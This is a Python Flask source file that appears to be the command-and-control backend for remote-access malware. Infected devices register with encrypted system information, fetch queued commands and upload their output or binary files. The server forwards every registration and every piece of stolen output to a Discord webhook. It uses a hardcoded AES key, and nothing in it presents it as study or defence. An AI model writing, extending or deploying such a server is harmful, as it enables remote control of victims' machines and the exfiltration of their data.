import json
import os
import base64
import tempfile
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests

app = Flask(__name__)

DISCORD_WEBHOOK = os.getenv(
    "DISCORD_WEBHOOK",
    "https://discord.com/api/webhooks/your_webhook_here"
)
ENCRYPTION_KEY = os.getenv(
    "ENCRYPTION_KEY",
    "_XTLJunX4DlP94U6k--kZ2pm6HrPBXYUjLxKsiFmAWc="
).encode()

devices = {}

def decrypt_data(payload):
    obj = json.loads(payload)
    iv = base64.b64decode(obj["iv"])
    ct = base64.b64decode(obj["data"])
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def encrypt_data(data):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return json.dumps({
        "iv": base64.b64encode(cipher.iv).decode(),
        "data": base64.b64encode(ct).decode()
    })

@app.route("/register/<device_id>", methods=["POST"])
def register(device_id):
    payload = request.json.get("payload")
    info = json.loads(decrypt_data(payload))
    devices[device_id] = {"info": info, "last_cmd": "", "last_output": ""}
    requests.post(DISCORD_WEBHOOK, json={"content": f"🟢 Device {device_id} registered: {info}"})
    return "OK"

@app.route("/upload/<device_id>", methods=["POST"])
def upload(device_id):
    payload = request.json.get("payload")
    data = decrypt_data(payload)
    try:
        text = data.decode()
        devices[device_id]["last_output"] = text
        requests.post(DISCORD_WEBHOOK, json={"content": f"📜 Output from {device_id}:\n```{text[:1500]}```"})
    except UnicodeDecodeError:
        path = os.path.join(tempfile.gettempdir(), f"{device_id}_data.bin")
        with open(path, "wb") as f:
            f.write(data)
        with open(path, "rb") as f:
            requests.post(DISCORD_WEBHOOK, files={"file": f}, data={"content": f"📎 Binary from {device_id}"})
    return "OK"

@app.route("/cmd/<device_id>", methods=["GET"])
def get_cmd(device_id):
    cmd = devices.get(device_id, {}).get("last_cmd", "")
    devices[device_id]["last_cmd"] = ""
    return encrypt_data(cmd.encode())

@app.route("/cmd/<device_id>", methods=["POST"])
def set_cmd(device_id):
    cmd = request.json.get("cmd", "")
    devices.setdefault(device_id, {})["last_cmd"] = cmd
    return "OK"

@app.route("/list", methods=["GET"])
def list_devices():
    return jsonify(devices)

def handler(request, context):
    return app(request, context)
